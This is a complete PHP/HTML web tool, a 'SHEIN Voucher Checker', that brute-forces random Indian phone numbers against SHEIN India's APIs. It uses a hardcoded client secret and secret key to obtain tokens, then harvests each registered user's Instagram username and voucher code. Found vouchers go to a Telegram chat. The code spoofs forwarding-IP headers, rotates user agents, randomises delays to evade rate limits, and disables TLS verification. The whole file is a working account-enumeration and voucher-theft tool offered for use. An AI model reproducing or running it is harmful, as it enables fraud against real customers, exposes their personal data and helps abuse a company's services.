<?php
// Handle API requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST');
    header('Access-Control-Allow-Headers: Content-Type');
    
    handleApiRequest();
    exit();
}

// Otherwise serve the HTML page
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHEIN Voucher Checker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
        }

        .config-section, .input-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .config-section h3, .input-section h3 {
            margin-bottom: 15px;
            color: #555;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }

        .button-group {
            display: flex;
            gap: 10px;
        }

        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
        }

        button:active {
            transform: translateY(2px);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .start {
            background: #28a745;
            color: white;
        }

        .start:hover:not(:disabled) {
            background: #218838;
        }

        .stop {
            background: #dc3545;
            color: white;
        }

        .stop:hover:not(:disabled) {
            background: #c82333;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-box {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .stat-box h3 {
            font-size: 16px;
            margin-bottom: 10px;
            opacity: 0.9;
        }

        .stat-box p {
            font-size: 32px;
            font-weight: bold;
        }

        .log-section, .results-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .log-section h3, .results-section h3 {
            margin-bottom: 15px;
            color: #555;
        }

        #log {
            background: #333;
            color: #0f0;
            padding: 15px;
            border-radius: 8px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
        }

        .log-entry {
            margin-bottom: 5px;
            border-bottom: 1px solid #444;
            padding-bottom: 5px;
        }

        .log-success {
            color: #28a745;
        }

        .log-error {
            color: #dc3545;
        }

        .log-warning {
            color: #ffc107;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            font-size: 14px;
        }

        td {
            padding: 12px;
            border-bottom: 1px solid #e0e0e0;
        }

        tr:hover {
            background: #f5f5f5;
        }

        .voucher-code {
            background: #28a745;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            display: inline-block;
        }

        .voucher-code:hover {
            background: #218838;
        }

        .info-text {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .stats {
                grid-template-columns: 1fr;
            }
            
            table {
                font-size: 12px;
            }
            
            th, td {
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SHEIN Voucher Checker</h1>
        
        <div class="config-section">
            <h3>Telegram Configuration</h3>
            <input type="text" id="botToken" placeholder="Bot Token" value="YOUR_BOT_TOKEN">
            <input type="text" id="chatId" placeholder="Chat ID" value="YOUR_CHAT_ID">
        </div>

        <div class="input-section">
            <h3>Phone Number Prefix</h3>
            <input type="text" id="prefix" placeholder="Enter prefix (e.g., 8, 81, 812)" maxlength="9">
            <div class="button-group">
                <button id="startBtn" class="start">Start Checking</button>
                <button id="stopBtn" class="stop" disabled>Stop</button>
            </div>
        </div>

        <div class="stats">
            <div class="stat-box">
                <h3>Not Registered</h3>
                <p id="notRegistered">0</p>
            </div>
            <div class="stat-box">
                <h3>Registered (No Voucher)</h3>
                <p id="registeredNoVoucher">0</p>
            </div>
            <div class="stat-box">
                <h3>Vouchers Found</h3>
                <p id="vouchersFound">0</p>
            </div>
            <div class="stat-box">
                <h3>API Errors</h3>
                <p id="apiErrors">0</p>
            </div>
        </div>

        <div class="log-section">
            <h3>Live Log</h3>
            <div id="log"></div>
        </div>

        <div class="results-section">
            <h3>Found Vouchers</h3>
            <table id="results">
                <thead>
                    <tr>
                        <th>Number</th>
                        <th>Instagram</th>
                        <th>Voucher Code</th>
                        <th>Amount</th>
                        <th>Min Purchase</th>
                        <th>Expiry</th>
                    </tr>
                </thead>
                <tbody id="resultsBody"></tbody>
            </table>
        </div>
    </div>

    <script>
        class VoucherChecker {
            constructor() {
                this.isRunning = false;
                this.prefix = '';
                this.stats = {
                    notRegistered: 0,
                    registeredNoVoucher: 0,
                    vouchersFound: 0,
                    apiErrors: 0
                };
                this.results = [];
                
                this.initElements();
                this.bindEvents();
            }

            initElements() {
                this.prefixInput = document.getElementById('prefix');
                this.botTokenInput = document.getElementById('botToken');
                this.chatIdInput = document.getElementById('chatId');
                this.startBtn = document.getElementById('startBtn');
                this.stopBtn = document.getElementById('stopBtn');
                this.logDiv = document.getElementById('log');
                this.resultsBody = document.getElementById('resultsBody');
                
                this.notRegisteredEl = document.getElementById('notRegistered');
                this.registeredNoVoucherEl = document.getElementById('registeredNoVoucher');
                this.vouchersFoundEl = document.getElementById('vouchersFound');
                this.apiErrorsEl = document.getElementById('apiErrors');
            }

            bindEvents() {
                this.startBtn.addEventListener('click', () => this.start());
                this.stopBtn.addEventListener('click', () => this.stop());
            }

            log(message, type = 'info') {
                const entry = document.createElement('div');
                entry.className = `log-entry log-${type}`;
                entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
                this.logDiv.appendChild(entry);
                this.logDiv.scrollTop = this.logDiv.scrollHeight;
            }

            updateStats() {
                this.notRegisteredEl.textContent = this.stats.notRegistered;
                this.registeredNoVoucherEl.textContent = this.stats.registeredNoVoucher;
                this.vouchersFoundEl.textContent = this.stats.vouchersFound;
                this.apiErrorsEl.textContent = this.stats.apiErrors;
            }

            addResult(result) {
                this.results.unshift(result);
                if (this.results.length > 50) this.results.pop();
                this.renderResults();
            }

            renderResults() {
                this.resultsBody.innerHTML = this.results.map(r => `
                    <tr>
                        <td>${r.number}</td>
                        <td>${r.instagram || 'N/A'}</td>
                        <td>
                            ${r.voucherCode && r.voucherCode !== 'N/A' ? 
                                `<span class="voucher-code" onclick="navigator.clipboard.writeText('${r.voucherCode}')">${r.voucherCode}</span>` : 
                                'N/A'}
                        </td>
                        <td>${r.voucherAmount || 'N/A'}</td>
                        <td>${r.minPurchase || 'N/A'}</td>
                        <td>${r.expiry || 'N/A'}</td>
                    </tr>
                `).join('');
            }

            async checkNumber(number) {
                try {
                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        body: JSON.stringify({
                            number: number,
                            botToken: this.botTokenInput.value,
                            chatId: this.chatIdInput.value
                        })
                    });

                    const data = await response.json();
                    
                    if (data.error) {
                        this.log(`❌ ${number}: ${data.error}`, 'error');
                        this.stats.apiErrors++;
                        this.updateStats();
                        return;
                    }

                    switch (data.status) {
                        case 'not_registered':
                            this.log(`❌ ${number}: Not registered`, 'error');
                            this.stats.notRegistered++;
                            break;
                            
                        case 'registered_no_voucher':
                            this.log(`⚠️ ${number}: Registered but no voucher`, 'warning');
                            this.stats.registeredNoVoucher++;
                            break;
                            
                        case 'success':
                            this.log(`✅ ${number}: VOUCHER FOUND! ${data.voucherCode} (₹${data.voucherAmount})`, 'success');
                            this.stats.vouchersFound++;
                            this.addResult({
                                number,
                                instagram: data.instagram,
                                voucherCode: data.voucherCode,
                                voucherAmount: data.voucherAmount,
                                minPurchase: data.minPurchase,
                                expiry: data.expiry
                            });
                            break;
                            
                        case 'error':
                            this.log(`❌ ${number}: ${data.error || 'API Error'}`, 'error');
                            this.stats.apiErrors++;
                            break;
                    }

                    this.updateStats();

                } catch (error) {
                    this.log(`❌ ${number}: Request failed - ${error.message}`, 'error');
                    this.stats.apiErrors++;
                    this.updateStats();
                }
            }

            generateRandomSuffix(length) {
                let suffix = '';
                for (let i = 0; i < length; i++) {
                    suffix += Math.floor(Math.random() * 10);
                }
                return suffix;
            }

            async start() {
                this.prefix = this.prefixInput.value.trim();
                
                if (!this.prefix) {
                    alert('Please enter a prefix');
                    return;
                }

                if (this.prefix.length > 9) {
                    alert('Prefix too long (max 9 digits)');
                    return;
                }

                this.isRunning = true;
                this.startBtn.disabled = true;
                this.stopBtn.disabled = false;
                this.prefixInput.disabled = true;

                this.log('🚀 Started checking numbers with prefix: ' + this.prefix);
                
                const remainingDigits = 10 - this.prefix.length;
                
                while (this.isRunning) {
                    const randomSuffix = this.generateRandomSuffix(remainingDigits);
                    const fullNumber = this.prefix + randomSuffix;
                    
                    await this.checkNumber(fullNumber);
                    
                    // Random delay between 2-5 seconds to avoid rate limiting
                    const delay = Math.floor(Math.random() * 3000) + 2000;
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }

            stop() {
                this.isRunning = false;
                this.startBtn.disabled = false;
                this.stopBtn.disabled = true;
                this.prefixInput.disabled = false;
                this.log('🛑 Stopped checking');
            }
        }

        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            new VoucherChecker();
        });
    </script>
</body>
</html>

<?php
// API Handler Function with Enhanced IP Spoofing
function handleApiRequest() {
    $input = json_decode(file_get_contents('php://input'), true);
    $number = $input['number'] ?? '';
    $botToken = $input['botToken'] ?? '';
    $chatId = $input['chatId'] ?? '';

    // Validate phone number
    if (!preg_match('/^\d{10}$/', $number)) {
        echo json_encode(['error' => 'Invalid phone number format']);
        return;
    }

    // Enhanced IP Spoofing Functions
    function generateRandomIndianIp() {
        // Indian IP ranges (simplified)
        $indianRanges = [
            ['start' => '1.186.0.0', 'end' => '1.187.255.255'],
            ['start' => '14.96.0.0', 'end' => '14.143.255.255'],
            ['start' => '27.4.0.0', 'end' => '27.7.255.255'],
            ['start' => '49.14.0.0', 'end' => '49.15.255.255'],
            ['start' => '59.88.0.0', 'end' => '59.95.255.255'],
            ['start' => '103.0.0.0', 'end' => '103.255.255.255'],
            ['start' => '106.192.0.0', 'end' => '106.255.255.255'],
            ['start' => '117.192.0.0', 'end' => '117.255.255.255'],
            ['start' => '120.56.0.0', 'end' => '120.63.255.255'],
            ['start' => '122.160.0.0', 'end' => '122.183.255.255']
        ];
        
        $range = $indianRanges[array_rand($indianRanges)];
        
        // Convert IP to long for range calculation
        $start = ip2long($range['start']);
        $end = ip2long($range['end']);
        
        // Generate random IP within range
        $random = mt_rand($start, $end);
        return long2ip($random);
    }

    function generateMobileIp() {
        // Generate IP that looks like mobile carrier IP
        $carrierPrefixes = ['10.', '100.', '101.', '102.', '103.', '104.', '105.', '106.', '107.', '108.', '109.', '110.'];
        $prefix = $carrierPrefixes[array_rand($carrierPrefixes)];
        return $prefix . rand(10, 250) . '.' . rand(10, 250) . '.' . rand(1, 250);
    }

    function generateForwardedFor() {
        // Generate multiple X-Forwarded-For values (simulating proxy chain)
        $ips = [];
        $count = rand(2, 4); // Chain of 2-4 IPs
        for ($i = 0; $i < $count; $i++) {
            $ips[] = rand(100, 200) . '.' . rand(10, 250) . '.' . rand(10, 250) . '.' . rand(1, 250);
        }
        // Add client IP at the end
        $ips[] = rand(100, 200) . '.' . rand(10, 250) . '.' . rand(10, 250) . '.' . rand(1, 250);
        return implode(', ', $ips);
    }

    // Enhanced HTTP Call function with better spoofing
    function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
        $ch = curl_init();
        
        // Add random delay to mimic human behavior
        $delay = rand(100000, 500000); // 0.1 to 0.5 seconds
        usleep($delay);
        
        // Generate multiple spoofed IP headers
        $ip = generateRandomIndianIp();
        $mobileIp = generateMobileIp();
        $forwardedFor = generateForwardedFor();
        
        // Enhanced headers for IP spoofing
        $spoofHeaders = [
            "X-Forwarded-For: $forwardedFor",
            "X-Real-IP: $ip",
            "X-Originating-IP: $mobileIp",
            "X-Remote-IP: $ip",
            "X-Remote-Addr: $ip",
            "X-Client-IP: $mobileIp",
            "X-Host: $ip",
            "Forwarded: for=$ip;proto=http;by=$mobileIp",
            "CF-Connecting-IP: $ip", // CloudFlare header
            "True-Client-IP: $mobileIp", // Akamai header
            "X-Forwarded-Host: sheinindia.in",
            "X-Forwarded-Server: sheinindia.in",
            "X-Forwarded-Proto: https"
        ];
        
        // Rotate User-Agents
        $userAgents = [
            "Dalvik/2.1.0 (Linux; U; Android 9; SM-G977N Build/PPR1.180610.011)",
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975F Build/QP1A.190711.020)",
            "Dalvik/2.1.0 (Linux; U; Android 11; SM-M315F Build/RP1A.200720.012)",
            "Dalvik/2.1.0 (Linux; U; Android 12; vivo 1902 Build/SP1A.210812.003)",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36"
        ];
        
        // Default headers
        $defaultHeaders = [
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.9,hi;q=0.8", // Added Hindi
            "Accept-Charset: utf-8, iso-8859-1;q=0.5",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            "Upgrade-Insecure-Requests: 1",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: cross-site",
            "User-Agent: " . $userAgents[array_rand($userAgents)]
        ];
        
        // Merge all headers
        $allHeaders = array_merge($defaultHeaders, $spoofHeaders, $headers);
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_HTTPHEADER => $allHeaders,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => $returnHeaders,
            CURLOPT_ENCODING => 'gzip, deflate',
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_COOKIEFILE => '', // Enable cookie handling
            CURLOPT_COOKIEJAR => '', // Enable cookie handling
            CURLOPT_AUTOREFERER => true
        ]);
        
        if (strtoupper($method) === "POST") {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if (curl_error($ch)) {
            error_log("CURL Error: " . curl_error($ch));
        }
        
        curl_close($ch);
        
        // Add random delay after request
        usleep(rand(100000, 300000));
        
        return $output;
    }

    function genDeviceId() { 
        return bin2hex(random_bytes(8)); 
    }

    function sendToTelegram($message, $botToken, $chatId) {
        if (empty($botToken) || empty($chatId) || $botToken === 'YOUR_BOT_TOKEN' || $chatId === 'YOUR_CHAT_ID') {
            return false;
        }
        
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => false
        ]);
        
        $headers = [
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        httpCall($url, $data, $headers, "POST");
        return true;
    }

    try {
        $adId = genDeviceId();

        // Step 1: Get access token
        $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
        $headers = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded"
        ];

        $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        $res = httpCall($url, $data, $headers, "POST");

        $j = json_decode($res, true);
        if (!$j || !isset($j['access_token'])) {
            error_log("Token generation failed. Response: " . substr($res, 0, 200));
            echo json_encode(['status' => 'error', 'error' => 'Error generating token', 'number' => $number]);
            return;
        }

        $access_token = $j['access_token'];

        // Add delay between requests
        usleep(rand(200000, 500000));

        // Step 2: Account check
        $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
        $headers = [
            "Authorization: Bearer $access_token",
            "Requestid: account_check_" . rand(1000, 9999),
            "X-Tenant: B2C",
            "Accept: application/json",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "Content-Type: application/x-www-form-urlencoded"
        ];

        $data = "mobileNumber=$number";
        $res = httpCall($url, $data, $headers, "POST");
        $j = json_decode($res, true);

        if (!$j) {
            echo json_encode(['status' => 'error', 'error' => 'Failed to check account', 'number' => $number]);
            return;
        }

        if (isset($j['success']) && $j['success'] === false) {
            echo json_encode(['status' => 'not_registered', 'number' => $number]);
            return;
        }

        if (!isset($j['encryptedId'])) {
            echo json_encode(['status' => 'error', 'error' => 'No encrypted ID', 'number' => $number]);
            return;
        }

        $encryptedId = $j['encryptedId'];

        // Add delay between requests
        usleep(rand(300000, 600000));

        // Step 3: Generate SHEINverse token
        $payload = json_encode([
            "client_type" => "Android/29",
            "client_version" => "1.0.8",
            "gender" => "",
            "phone_number" => $number,
            "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id" => $encryptedId,
            "user_name" => ""
        ]);

        $headers = [
            "Accept: application/json",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "Content-Type: application/json; charset=UTF-8"
        ];

        $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
        $res = httpCall($url, $payload, $headers, "POST");
        $j = json_decode($res, true);

        if (!$j || empty($j['access_token'])) {
            echo json_encode(['status' => 'registered_no_voucher', 'number' => $number]);
            return;
        }

        $sheinverse_access_token = $j['access_token'];

        // Add delay between requests
        usleep(rand(200000, 400000));

        // Step 4: Get user data
        $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
        $headers = [
            "Authorization: Bearer " . $sheinverse_access_token,
            "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
            "Accept: */*",
            "Origin: https://sheinverse.galleri5.com",
            "X-Requested-With: com.ril.shein",
            "Referer: https://sheinverse.galleri5.com/"
        ];

        $res = httpCall($url, "", $headers, "GET");
        $decoded = json_decode($res, true);

        if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
            echo json_encode(['status' => 'registered_no_voucher', 'number' => $number]);
            return;
        }

        // Extract data
        $username = $decoded['user_data']['instagram_data']['username'];
        $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
        $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
        $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
        $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';

        // Prepare result
        $result = [
            'status' => ($voucher !== 'N/A') ? 'success' : 'registered_no_voucher',
            'number' => $number,
            'instagram' => $username,
            'voucherCode' => $voucher,
            'voucherAmount' => $voucher_amount,
            'minPurchase' => $min_purchase_amount,
            'expiry' => $expiry_date
        ];

        // Send to Telegram if voucher found
        if ($voucher !== 'N/A' && !empty($botToken) && !empty($chatId)) {
            $message = "🎉 <b>VOUCHER FOUND!</b> 🎉\n\n";
            $message .= "📱 <b>Number:</b> <code>$number</code>\n";
            $message .= "📸 <b>Instagram:</b> $username\n";
            $message .= "🎫 <b>Voucher Code:</b> <code>$voucher</code>\n";
            $message .= "💰 <b>Amount:</b> ₹$voucher_amount\n";
            $message .= "🛒 <b>Min Purchase:</b> ₹$min_purchase_amount\n";
            $message .= "⏰ <b>Expiry:</b> $expiry_date\n\n";
            $message .= "https://t.me/share/url?url=" . urlencode($voucher);
            
            sendToTelegram($message, $botToken, $chatId);
        }

        echo json_encode($result);

    } catch (Exception $e) {
        error_log("Exception: " . $e->getMessage());
        echo json_encode(['status' => 'error', 'error' => $e->getMessage(), 'number' => $number]);
    }
}
?>
